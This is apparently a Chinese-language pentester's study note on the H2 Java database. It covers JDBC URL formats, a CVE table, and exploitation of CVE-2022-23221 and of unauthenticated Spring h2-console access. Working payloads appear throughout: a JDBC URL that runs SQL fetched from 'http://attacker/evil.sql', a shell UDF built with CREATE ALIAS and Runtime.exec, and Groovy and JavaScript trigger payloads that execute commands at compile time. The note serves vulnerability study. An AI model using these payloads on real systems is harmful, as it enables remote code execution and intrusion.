# H2 Database

H2是一个用Java开发的嵌入式数据库。H2的运行模式包括：内嵌模式（本地连接，使用JDBC）、服务器模式(远程连接，从其他进程或其他机器访问，在TCP层使用JDBC或ODBC)、混合模式（设置AUTO_SERVER=TRUE，同时支持本地或远程）。各运行模式的Url如下
```

本地连接——本地文件连接
jdbc:h2:~/test
jdbc:h2:file:/data/sample
jdbc:h2:file:C:/data/sample(windows)

本地连接——内存数据库
jdbc:h2:mem:（私有格式，只有一个到内存数据库的连接）
jdbc:h2:mem:<databaseName>（这样到内存数据库有多个连接，但是默认最后一个连接关闭时会关闭内存数据库，如果要保持数据库连接添加DB_CLOSE_DELAY=-1）

服务器模式
jdbc:h2:tcp://<server>[:<port>]/[<path>]<databaseName>
jdbc:h2:ssl://<server>[:<port>]/<databaseName>
jdbc:h2:tcp://localhost/~/test
jdbc:h2:tcp://localhost/mem:test 
jdbc:h2:ssl://localhost:8085/~/sample;
```

数据库连接时可以进行一些设置，例如连接时执行sql
```
jdbc:h2:<url>;INIT=RUNSCRIPT FROM '~/create.sql'  // 执行一个sql文件
jdbc:h2:file:~/sample;INIT=RUNSCRIPT FROM '~/create.sql'\;RUNSCRIPT FROM '~/populate.sql'  // 执行多个sql文件
```

官方网站：http://www.h2database.com/html/main.html

历史安装版本下载地址：http://www.h2database.com/html/download-archive.html

重点历史漏洞：
| 漏洞编号 | 漏洞类型 | 影响版本 |
|:---:|:---:|:---:|
|CVE-2021-23463|SQL|< 2.0.202 |
|CVE-2021-42392|RCE|<= 2.0.204|
|CVE-2022-23221|RCE|< 2.1.210|

## CVE-2022-23221
参考链接： https://packetstormsecurity.com/files/165676/H2-Database-Console-Remote-Code-Execution.html
对于数据库URL的官方说明： http://www.h2database.com/html/features.html

这个漏洞用到的payload
```
jdbc:h2:mem:1337;IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;INIT=RUNSCRIPT
FROM 'http://attacker/evil.sql';'\
```
`INIT`参数是H2数据库的JDBC URL支持的一个配置，即在连接数据库时支持执行一条初始化命令，但命令中不能包含分号。这个Payload又借助了另一个命令`RUNSCRIPT`，该命令用于执行SQL文件，例如`RUNSCRIPT FROM './evil.sql'`，对应的处理类是`h2/src/main/org/h2/store/fs/FilePathDisk.java`
```
    public InputStream newInputStream() throws IOException {
        if (name.matches("[a-zA-Z]{2,19}:.*")) {
            if (name.startsWith(CLASSPATH_PREFIX)) { // classpath: ...}
            URL url = new URL(name);
            return url.openStream();
        }
        FileInputStream in = new FileInputStream(name);
        IOUtils.trace("openFileInputStream", name, in);
        return in;
    }
```
而这个类再读取数据时，也可以读取url地址。所以就可以将命令执行的sql写到文件中。进而造成RCE。参考链接中给出的sql内容如下，也可以参照文章下方的命令执行部分的sql，实现JDBC注入造成命令执行
```
CREATE TABLE test (
     id INT NOT NULL
 );

CREATE TRIGGER TRIG_JS BEFORE INSERT ON TEST AS '//javascript
var fos = Java.type("java.io.FileOutputStream");
var b = new fos ("/tmp/pwnedlolol");';

INSERT INTO TEST VALUES (1);
```

## CVE-2021-42392
参考链接： https://jfrog.com/blog/the-jndi-strikes-back-unauthenticated-rce-in-h2-database-console/

## Spring+H2 未授权访问
SpringBoot配置H2一般如下，这样会为web应用增加一个路径`/h2-console/`，这个默认路径可以通过`spring.h2.console.path`来修改。
```
spring.h2.console.enabled=true
spring.h2.console.settings.web-allow-others=true
```
而spring.h2.console.settings.web-allow-others设置为true，就会允许任意用户访问console。造成未授权访问。然后可以与上述JNDI攻击配合。

## 命令执行
https://www.h2database.com/html/commands.html

根据上述官方官方文档，H2支持的命令中`CREATE ALIAS`和`CREATE TRIGGER`可以让用户自定义函数（UDF），P牛给出一个自定义shell函数的写法，其中两个`$`符号表示无需转义的长字符串。
```
CREATE ALIAS shell AS $$void shell(String s) throws Exception { java.lang.Runtime.getRuntime().exec(s);
}$$;
SELECT shell('cmd /c calc.exe');
```
这个利用的前提是（1）h2 console支持“创建”数据库，如果默认不支持则需要在启动console时添加`-ifNotExists`参数（2）目标系统配置了javac （3）创建UDF并执行


## 不出网命令执行
后来P牛也提到，如果实战中，遇到不出网的情况，上面CVE-2022-23221从url中加载sql文件就无法生效。init只能执行一条sql。也就是只能定义UDF不能执行UDF。就需要在定义的时候就让代码执行。然后提出了利用Groovy元编程的技巧，在编译Groovy语句(而非执行时)就执行攻击者预期的代码。
```
jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS shell2 AS $$@groovy.transform.ASTTest(value={
assert java.lang.Runtime.getRuntime().exec("cmd.exe /c calc.exe") })
def x$$
```
但是这个不出网利用要用到本地的groovy依赖，并且这个groovy依赖不是常见的groovy库，而是groovy-sql，依赖如下
```
<dependency>
  <groupId>org.codehaus.groovy</groupId>
  <artifactId>groovy-sql</artifactId>
  <version>3.0.8</version>
</dependency>
```

这个限制就很难了。所以P牛又提到了`CREATE TRIGGER`。官方文档表明，可以使用`javax.script.ScriptEngineManager`创建org.h2.api.Trigger的实例。来解析javascript或ruby脚本。由于`javax.script.ScriptEngineManager`是jdk自带的，避免了需要`groovy-sql`这种第三方依赖的问题。

而Trigger在编译对象时，只通过前缀来判断脚本。`org.h2.schema.TriggerObject@loadFromSource`代码如下
```java
if (SourceCompiler.isJavaxScriptSource(triggerSource)) {
    return (Trigger) compiler.getCompiledScript(fullClassName).eval();
}

public static boolean isJavaxScriptSource(String source) {
    return isJavascriptSource(source) || isRubySource(source);
}

private static boolean isJavascriptSource(String source) { 
    return source.startsWith("//javascript"); // 
}

private static boolean isRubySource(String source) { 
    return source.startsWith("#ruby");
}
```
代码表明只要以`//javascript`开头就认为是javascript脚本，构造的payload如下。`//javascript`后面需要有个换行！这个jdbc url相对上面的payload来讲，没有什么限制。只要在paylaod可控的背景下就可以攻击。
```
jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript
    java.lang.Runtime.getRuntime().exec('cmd /c calc.exe')
$$
```

很多攻击是基于H2 database console界面的，利用方式存在一些限制。但是如果能直接控制JDBC URL的场景，就没有如下的限制。
```
开启 -webAllowOthers 选项，支持外网访问
开启 -ifNotExists 选项，支持创建数据库
```
